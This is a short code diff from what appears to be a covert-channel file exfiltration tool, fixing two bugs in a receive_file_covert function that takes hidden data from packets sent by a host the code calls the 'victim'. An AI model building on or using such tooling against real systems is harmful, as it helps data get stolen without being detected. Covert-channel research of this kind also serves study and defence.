@@ -3739,7 +3739,7 @@ def receive_file_covert(client_socket: socket.socket,
                 victim_ipv6_addr, _ = __get_target_ipv6_address(client_socket, client_ip, client_port)
 
                 # Send own IPv6 address and port
-                client_socket.send((source_ipv6_ip + "/" + source_ipv6_port).encode())
+                client_socket.send((source_ipv6_ip + "/" + str(source_ipv6_port)).encode())
 
                 # Get total count of packets
                 count = get_packet_count(client_socket)
@@ -3805,7 +3805,7 @@ def receive_file_covert(client_socket: socket.socket,
                                      for packet in received_packets if packet_callback(packet))
 
             # Write Data to File
-            covert_data_write_to_file(extracted_data, file_name)
+            covert_data_write_to_file(extracted_data, save_file_path)
 
             # Send ACK to victim (if good)
             if is_file_openable(save_file_path):
